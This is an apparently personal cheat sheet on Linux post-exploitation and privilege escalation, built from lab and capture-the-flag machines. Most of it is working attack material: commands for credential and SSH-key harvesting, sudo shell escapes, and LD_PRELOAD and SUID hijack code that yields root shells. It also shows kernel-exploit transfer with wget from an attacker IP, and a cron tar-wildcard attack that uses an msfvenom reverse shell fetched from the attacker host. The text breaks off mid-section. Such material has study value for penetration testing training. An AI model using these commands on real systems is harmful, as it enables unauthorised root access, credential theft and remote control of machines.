### [LINUX POST EXPLOIT ENUMERATION](#)


#### Hidden Listening Ports

The netstat shows a few ports that weren’t available from the outside:
```
netstat -tnlp
```
```
www-data@soccer:/$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1089/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1089/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
There’s still not much information about what 9091 could be. Port 3000 looks to be another web page:
```
www-data@soccer:/$ curl localhost:3000
<!DOCTYPE html>          
<html lang="en">              
    <head>                                                           
        <meta charset="UTF-8">   
        <meta http-equiv="X-UA-Compatible" content="IE=edge">                                                                             
        <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                            
        <link href="/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">                                                          
        <script src="/js/bootstrap.bundle.min.js"></script>                                                                               
        <script src="/js/jquery.min.js"></script>
...[snip]...
```
3306 and 33060 both seem to be MySQL instances:
```
www-data@soccer:/$ mysql -p 3306
Enter password: 
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
www-data@soccer:/$ mysql -p 33060
Enter password: 
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
```

###### OS Enumeration

- Kernel version and System architecture
    - `unmae -r`, `uname -a`
    - `cat /proc/version`
        - Check if kernel exploit exist
- Linux Distribution type and its version
    - `cat /etc/issue`

###### Users and Privileges

- Users looged in, Users last logged in
    - `id`, `who`, `whoami`, `w`, `last`
- History of user activity
    - `cat ~/.bash_history`
- List of users
    - `cat /etc/passwd`
- Sudo permissions, 
    - `sudo -l`
        - check each binary properly
- Permissions for sensetive files
    - `cat /etc/sudoers`
    - `cat /etc/shadow`
        - check if you have write access
- Interesting files in home directories if any
    - `ls -ahlR /home`
- Permission for sensetive directories
    - `ls -ahlR /root/`
- Writable directories for user
    - `find / -type d -writable 2>/dev/null` / `find / -type d -perm -222 2>/dev/null` / `find / -perm -o+w -type d 2>/dev/null `
        - this can be used to keep our payloads
- Writable files for user
    - `find / -perm -o+w -type f -ls 2>/dev/null`
- Writable Config files in /etc 
    - `find / -perm -o+w -type f -ls 2>/dev/null | grep /etc`
- Checking Environmental variables
    - `echo $PATH`
        - Check if there is writable folder in PATH
- SUID / GUID permission files
    - `find / -type f -perm -04000 -ls 2>/dev/null` / `find / -type f -perm -u=s -ls 2>/dev/null`
    - `find / -type f -perm -02000 -ls 2>/dev/null` / `find / -type f -perm -g=s -ls 2>/dev/null`
- 


###### Information Enumeration

- Listenting ports
`netstat -nlap | grep LIST`

- Possible Ways to upload file

    - `find / -name wget  2>/dev/null `
    - `find / -name netcat  2>/dev/null `
    - `find / -name nc  2>/dev/null `
    - `find / -name ftp 2>/dev/null`

- SSH private and public key hunting

    - `ls -la /home /root /etc/ssh /home/*/.ssh/`
    - `find / -name authorized_keys 2> /dev/null`
    - `locate id_rsa` / `locate id_dsa` / `find / -name id_rsa 2> /dev/null` / `find / -name id_dsa 2> /dev/null`
    - `cat /home/*/.ssh/id_rsa` / `cat /home/*/.ssh/id_dsa`
    - `cat /etc/ssh/ssh_config` / `cat /etc/sshd/sshd_config`
    - `cat ~/.ssh/authorized_keys` / `cat ~/.ssh/identity.pub` / `cat ~/.ssh/identity` / `cat ~/.ssh/id_rsa.pub` / `cat ~/.ssh/id_rsa` / `cat ~/.ssh/id_dsa.pub` / `cat ~/.ssh/id_dsa`

- Any settings/files (hidden) on website, Any settings file with database information

    - `ls -alhR /var/www/` / `ls -alhR /srv/www/htdocs/` / `ls -alhR /usr/local/www/apache22/data/` / `ls -alhR /opt/lampp/htdocs/` / `ls -alhR /var/www/html/`
- Checking logs file in directories

    - `/etc/httpd/logs`
    - `/var/log/`

- Development tools/languages are installed/supported

    - `cat /proc/version` (tellls us if `gcc` is installed)
    - `find / -name python 2>/dev/null`
    - `find / -name perl 2>/dev/null`

###### Serivces Enumeration

- Services Running and their Privileges
    - `ps`, `ps aux`, `ps aux | grep root`
        - check which services are running by root, and which are vulnerable

###### Cron Jobs Enumeration

- Checking system-wide cron jobs    
    - `crontab -l`
    - `cat /etc/crontab`
        - check cron jobs of root user, analyse content of file assosiated

###### File System Enumeration

- How are files system mounted
    - `mount`, `df -h`
- Are there any unmounted file-systems
    - `cat /etc/fstab`

###### DNS Server Enumeration

- Checking DNS server's used
    - (miscondifured DNS server may be vulnerble to `DNS Zone Transfer attacks`)
    - `/etc/resolve.conf`



### [LINUX PRIVILEGE ESCALATION](#)

###### PrivEsc Tools/Scripts

> The first thing you should do is run one or more of these, save the output they give you and just read them. Try to find any obvious things sticking out and don't rush to try kernel exploits even if you see them suggested here. Kernel exploits, while effective, will frequently crash the system if they fail. 

- [LinEnum.sh](https://github.com/rebootuser/LinEnum)

- [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

- [Linux Exploit Suggestor](https://github.com/The-Z-Labs/linux-exploit-suggester)

more - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#linux-unix-privesc-tools

###### Kernel Exploits

- Linux Exploit Suggestor
    - `/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh`
        - suggested dirtycow exploit, downloaded and used
    - `mv 40839.c dirtcowexploit.c` >`python -m http.server 80` > `wget http://10.17.107.227/dirtcowexploit.c -P /tmp/` > `cd /tmp` > `gcc dirtcowexploit.c -pthread -o dirty -lcrypt` > `./dirty` > `su firefart`

- Linux Kernel 3.13.0 < 3.19 - 'overlayfs' Local Privilege Escalation 
    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`

- Exploit DB
    - `mv 37292.c exploit.c` > `python -m http.server 80`  > `wget http://10.17.107.227/exploit.c -P /tmp/` > `cd tmp` > `gcc exploit.c -o exploit` > `./exploit`

###### SUDO Misconfigured Permissions

- Privilege Escalation by SUDO (Shell Escaping)
    - `sudo man ls` > `!/bin/bash`
    - `sudo nano /etc/sudoers` > `karen ALL=NOPASSWD:ALL` > `sudo su`
    - `sudo nano` > `Ctrl+R then Ctrl+X,` > `sh 1>&0 2>&0`
    - `sudo find . -exec /bin/sh \; -quit`
    - `sudo awk 'BEGIN {system("/bin/sh")}'`
    - `sudo vim -c '!sh'`
    - `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
    - `sudo apache2 -f /etc/shadow`
    - `sudo systemctl xyz` > `!sh`


EAMPLE for easy_install
```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

# easy_install is a now deprecated way to install packages in Python. At it’s heart, it’s running a setup.py script which promises to take certain actions to install the package.

developer@updown:~$ sudo easy_install
error: No urls, filenames, or requirements specified (see --help)

# It can take a URL (so I could host something malicious on my machine and fetch it), but it can also just take a directory. I’ll create a directory:

developer@updown:~$ mkdir /tmp/0xdf
developer@updown:~$ cd /tmp/0xdf
developer@updown:/tmp/0xdf$

# put malicious script into setup.py:

developer@updown:/tmp/0xdf$ echo -e 'import os\n\nos.system("/bin/bash")' > setup.py

# Now I just call easy_install pointing to that directory:

developer@updown:/tmp/0xdf$ sudo easy_install /tmp/0xdf/
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing 
Writing /tmp/0xdf/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/0xdf/egg-dist-tmp-ObdjVa
root@updown:/tmp/0xdf# id
uid=0(root) gid=0(root) groups=0(root)
```

- Privilege Escalation by SUDO (Shared object Injection through env variable `LD_PRELOAD` and `LD_LIBRARY_PATH`)
    - `nano exploit.c`
        ```
        #include <stdio.h>
        #include <stdlib.h>
        #include <sys/types.h>
        void _init() {
            unsetenv("LD_PRELOAD");
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
            }   
        ```
        -  `gcc -fPIC -shared -nostartfiles -o ./libncursesw.so.6 ./exploit.c` > `sudo LD_PRELOAD=./libncursesw.so.6 nano`

    - `nano /tmp/preload.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }

        ```
        - `gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c` > `sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2`

    - `ldd /usr/sbin/apache2` > `nano /home/user/tools/sudo/library_path.c`
        ```
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_LIBRARY_PATH");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```
        - `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` > `sudo LD_LIBRARY_PATH=/tmp apache2`

###### SUID Misconfigured Permissions

**What is SUID (Set owner UserID) ?**

In addition to the rwx (read, write, execute) permission linux also provide user with specialised permissions that can be utilizsed in specific situations one of these access permission is SUID (Set Owner User Id) permission.

SUID files execute with the permission of the file owner. SUID allows a user to run a program using another users privileges

we can take advantage of having a file run as another user, to execute commands as them. You might be thinking, why allow anyone to run a file as another user in the first place? However, we need to have certain binaries run as root by a non-privileged user.

The success of our attack will depend on following factors

- `Ownner of SUID binary should be root user or other privileged user`

- `We should have execute permission`

```
1. find all files with the SUID bit set
2. exploit 

Example 1 - we found binary `/usr/bin/base64` which we can use as owner ie as root (Use GTFObins for such common binaries)

Example 2 - (inject into object) we examine SUID binary named 'welcome' using strings and found it uses another binary named 'greetings', this means we can put whatever we want in greetings and it will be executed with `root` privileges,  we will simply copy `/bin/bash` into greetings

Example 3 - (Create nonexistent object)we examine SUID binary named 'suid-so' using strings and found a string '/home/user/.config/libcalc.so', further we found that '.config' file dosent even exist in this directory, we can take advantage of this thing, we can create this directory and write our own code for `libcalc.so`, we write our code in libcalc.c and then compile it to get file libcalc.so

Example 4 - SUID file with known CVE 

Example 5  - (Use PATH env variable for nonexistent command) we examine SUID binary named 'suid-env' using strings and found a string 'service apache2 start', when we try to run binary it gave error "service: command not found" , we know that for any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under `PATH`. If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script

Example 6 - (in Bash versions <4.2-048 we can create functions whose name resemble file paths) we examine SUID binary names 'suid-env2' using strings and found string '/usr/sbin/service apache2 start' this is similar to example5 but here it has absolute path of service executable (/usr/sbin/service) to start the apache2 webserver. In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable, we make use of it

# `Privilege Escalation by - SUID (`Abusing Shell Features`)`

```
**find all files with the SUID bit set**
```
find / -perm -4000 2>/dev/null 
```
**find binaries that run as the root user**
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```
**Example 1**

find all files with SUID bit set
```
karen@ip-10-10-220-105:/$ find / -type f -perm -04000 -ls 2>/dev/null

 1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
```
we can see binary `/usr/bin/base64` which we can use as owner ie as root,  so that means we can encode and decode the /etc/shadow file as well, which can give us hashes of users, becuase when we decode we can see the content 
```
karen@ip-10-10-220-105:/$ base64 /etc/shadow | base64 --decode

karen@ip-10-10-220-105:/$ base64 /etc/passwd | base64 --decode
```
Next we need to "combine" these two together into a file that we can leverage John to crack the hashes, we can use the `unshadow tool` to do this, giving the two files as input
```
unshadow passwd.txt shadow.txt > crackme.txt
```

**Example 2**

(Shared Object Injection) we examine SUID binary named 'welcome' using strings and found it uses another binary named 'greetings', this means we can put whatever we want in greetings and it will be executed with `root` privileges,  we will simply copy `/bin/bash` into greetings

```
student@attackdefense:/$ find /home -user root

/home
/home/student/.bashrc 
/home/student/welcome
/home/student/greetings
```
we can check using `file` type and using command `strings`
```
student@attackdefense:~$ `file welcome`
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=199bc8fd6e66e29f770cdc90ece1b95484f34fca, not stripped

student@attackdefense:~$ `strings welcome`
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main   
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings
```
we observe its calling on `greetings` binary this means we can put whatever we want in greetings and it will be executed with `root` privileges
we will simply copy `/bin/bash` or basically rename it as greetings binary, we see that after this if we run greetings binary we get bash with student user however if we run welcome binary it gives us bash with root user because it is running as root and its utlising our greetings binary
```
student@attackdefense:~$ cat greetings
cat: greetings: Permission denied
student@attackdefense:~$ rm greetings
rm: remove write-protected regular file 'greetings'? yes
student@attackdefense:~$ ls
welcome
student@attackdefense:~$ cp /bin/bash greetings
student@attackdefense:~$ ls
greetings  welcome
student@attackdefense:~$ ./greetings
student@attackdefense:~$
student@attackdefense:~$ ./welcome
root@attackdefense:~# whoami
root
root@attackdefense:~#
```

**Example 3**
we exampline binary named 'suid-so' using strings and found a string '/home/user/.config/libcalc.so', further we found that '.config' file dosent even exist in this directory, we can take advantage of this thing, we can create this directory and write our own code for `libcalc.so`, we write our code in libcalc.c and then compile it to get file libcalc.so

```
TCM@debian:/tmp$  find / -type f -perm -04000 -ls 2>/dev/null

809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
```
Lets utilize strings to display a list of useful strings found in the binary.
```
TCM@debian:~$ `strings /usr/local/bin/suid-so`
/lib64/ld-linux-x86-64.so.2
#eGVO
CyIk
libdl.so.2
__gmon_start__
_Jv_RegisterClasses
dlopen
libstdc++.so.6
_ZNSt8ios_base4InitD1Ev
_ZNSolsEPFRSoS_E
__gxx_personality_v0
/home/user/.config/libcalc.so
Done.
Y@-C
```
Cross checking the `libcalc.so` directory on the user’s home directory showed that, the `.config` directory doesn’t even exist.
```
TCM@debian:~$ `ls /home/user/.config`
ls: cannot access /home/user/.config: No such file or directory
TCM@debian:~$ 
```
We can take advantage of this thing, we can create this directory and write our own code for `libcalc.so`
```
TCM@debian:~$ `touch  /home/user/.config/libcalc.c`
TCM@debian:~$ `nano  /home/user/.config/libcalc.c`

  #include <stdio.h>
  #include <stdlib.h>

  static void inject() __attribute__((constructor));

  void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
  }
```
This code copies the bash binary(owned by root) into /tmp, Then it assigns the SUID permission to the binary in the /tmp directory and then execute it from the /tmp directory.

Lets compile and use it using original file we discovered, To execute the code in libcalc.so, let’s execute the suid-so binary.
```
TCM@debian:~$ gcc /home/user/.config/libcalc.c -o /home/user/.config/suid-so

TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# `id`
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```

**Example 4**
```
Known exploit example 1 - for file exim-4.84-3 - cve-2016-1531
Known exploit example 2 - for file  Enlightenment - CVE-2022-37706
```

Known exploit example 1
```
TCM@debian:/$ `find / -type f -perm -04000 -ls 2>/dev/null`
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
```
If we search for this version of exim its vulnerable, we can find known exploit available,  Downlod , Transfer it to target and Run the exploit script to gain a root shell
```
user@debian:~$ `/home/user/tools/suid/exim/cve-2016-1531.sh`
CVE-2016-1531 local root exploit
sh-4.1# `id`
uid=0(root) gid=1000(user) groups=0(root)
sh-4.1# 
```


Known exploit example 2 - https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html#enumeration-1
```
larissa@boardlight:~$ find / -perm -4000 2>/dev/null                   
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
```
The four related to enlightenment are interesting. Enlightenment is a Windows manager for the X Windows System. 

CVE-2022-37706 is a vulnerability in:
enlightenment_sys in Enlightenment before 0.25.4 allows local users to gain privileges because it is setuid root, and the system library function mishandles pathnames that begin with a /dev/.. substring

There is a nice POC shell script in the repo, but it’s not hard to do manually

https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html#enumeration-1

**Example 5**

(Use PATH env variable for nonexistent command) we examine SUID binary named 'suid-env' using strings and found a string 'service apache2 start', when we try to run binary it gave error "service: command not found" , we know that for any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under `PATH`. If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script

```
TCM@debian:/$ `find / -type f -perm -04000 -ls 2>/dev/null`

809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
```
Lets check /usr/local/bin/suid-env using strings
```
TCM@debian:/$ `strings /usr/local/bin/suid-env`
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
lets also run it and see
```
TCM@debian:/$ `/usr/local/bin/suid-env`
sh: service: command not found
TCM@debian:/$ 
```
We can observe that it cant find `service` command, 
we know that for any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under `PATH`. 
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script
 Lets see folders in PATH
```
TCM@debian:/$ `echo $PATH`
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
TCM@debian:/$ 
```
None of the folders are writable, lets try to add /tmp in PATH as for user TCM /tmp is writable
```
TCM@debian:/$ `export PATH=/tmp:$PATH`
TCM@debian:/$ `echo $PATH`
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
TCM@debian:/$ 
```
lets create a binary service in /tmmp and write our code into it
```
TCM@debian:/$ `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
TCM@debian:/$ `gcc /tmp/service.c -o /tmp/service`
TCM@debian:/$ 
```
 Lets now run again the SUID binary we found, we got the root
```
TCM@debian:/$ `/usr/local/bin/suid-env`
root@debian:/# `id`
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/# 
```

**Example 6**
in Bash versions <4.2-048 we can create functions whose name resemble file paths) we examine SUID binary names 'suid-env2' using strings and found string '/usr/sbin/service apache2 start' this is similar to example5 but here it has absolute path of service executable (/usr/sbin/service) to start the apache2 webserver. In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable, we make use of it

```
TCM@debian:/$ `find / -type f -perm -04000 -ls 2>/dev/null`
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
```
lets check `/usr/local/bin/suid-env2` executable
```
TCM@debian:~$ `strings /usr/local/bin/suid-env2`
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
lets run it once
```
TCM@debian:~$ `/usr/local/bin/suid-env2`
[....] Starting web server: apache2httpd (pid 1788) already running
. ok 
TCM@debian:~$ `file /usr/sbin/service`
/usr/sbin/service: POSIX shell script text executable
```
The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver. Lets verify `Bash version`
```
user@debian:~$ `/bin/bash --version`
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
user@debian:~$ 
```
In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path, Lets `Create a Bash function` with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function
```
TCM@debian:~$ `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`

TCM@debian:~$ `export -f /usr/sbin/service`
```
Run the suid-env2 executable to gain a root shell
```
TCM@debian:~$ `/usr/local/bin/suid-env2`
root@debian:~# `id`
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# 
```

###### Cron Jobs by Root user

- Privilege Escalation - Cron (abusing cron job created by root user if found)

    - `ls -al`
        - found a file message with permission -rw-------
    - `cat message`
        - permission denied
        - checking if path of this file used anywhere
    - `grep -rnw /usr -e "/home/student/message"`
        ```
        /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
        ```
        - found it in copy.sh sexond line, its copying itself into /tmp/message
    - `ls -al /usr/local/share/copy.sh`
        ```
        -rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
        ```
    - `cat /usr/local/share/copy.sh`
        ```
        #! /bin/bash
        cp /home/student/message /tmp/message
        chmod 644 /tmp/message
        ```
    - `printf '#!bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
        - we addedd permission for student in sudoers
        - once cron job is run we can sudo and get root
    - `sudo su`

- Privilege Escalation  - Cron (Utilising writable foleder in `PATH` variable)
    - `cat /etc/crontab`
        ```
        PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        -  `echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >/home/user/overwrite.sh` > `chmod +x /home/user/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (File Overwrite)

    - `cat /etc/crontab`
        ```
        # m h dom mon dow user  command
        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
        #
        * * * * * root overwrite.sh
        * * * * * root /usr/local/bin/compress.sh
        ```
        - `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh` > `/tmp/bash -p`

- Privilege Escalation  - Cron (Wildcard)

    - `cat /etc/crontab` > `cat /usr/local/bin/compress.sh`
        ```
        #!/bin/sh
        cd /home/user
        tar czf /tmp/backup.tar.gz *
        ```
        - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.107.227 LPORT=4444 -f elf -o reverseshell.elf` > `python -m http.server 80`
        - `wget http://10.17.107.227/reverseshell.elf -P /tmp/` > `mv /tmp/reverseshell.elf /home/user/`
        - `touch /home/user/--checkpoint=1`
        - `touch /home/user/--checkpoint-action=exec=reverseshell.elf`
        - Now we can listen on our machine, when cron job would run we get root
        - `nc -nlvp 4444`

###### SSH Keys or Password in config files

- Public and private keys are generally stored in one of the following locations:
    - `/root/.ssh/`
    - `/home/user_name/.ssh/` (users home directory)
    - `/etc/ssh/`
    - In the paths specified in the `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` config files

-  The following command can be used to identify any existing public or private keys and their permissions:
